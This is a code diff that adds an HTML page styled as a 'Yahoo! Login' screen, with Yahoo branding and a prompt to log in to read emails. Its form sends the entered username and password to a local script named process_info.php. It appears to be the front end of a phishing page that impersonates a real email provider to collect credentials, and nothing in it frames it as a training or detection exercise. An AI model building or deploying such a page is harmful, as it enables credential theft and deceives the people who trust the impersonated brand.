@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yahoo! Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            width: 100%;
+        }
+
+        .left-section,
+        .right-section {
+            padding: 20px;
+            width: 50%;
+        }
+
+        .left-section {
+            text-align: left;
+        }
+
+        .right-section {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .left-section h1,
+        .right-section h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #720e9e;
+        }
+
+        .left-section p {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        .right-section .logo {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background-color: #720e9e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+        }
+
+        .right-section .logo::after {
+            content: "Y!";
+            font-size: 60px;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+            font-weight: bold;
+            position: relative;
+            top: 10px;
+        }
+
+        .right-section .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .right-section .login-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #720e9e;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="left-section">
+        <h1>Yahoo!</h1>
+        <p>Welcome to Yahoo! Please log in to access your emails.</p>
+    </div>
+
+    <div class="right-section">
+        <h1>Yahoo!</h1>
+        <div class="logo"></div>
+        <form class="login-form" id="loginForm" action="process_info.php" method="post">
+            <input type="text" placeholder="Username or Email" name="uname" required>
+            <input type="password" placeholder="Password" name="password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
+
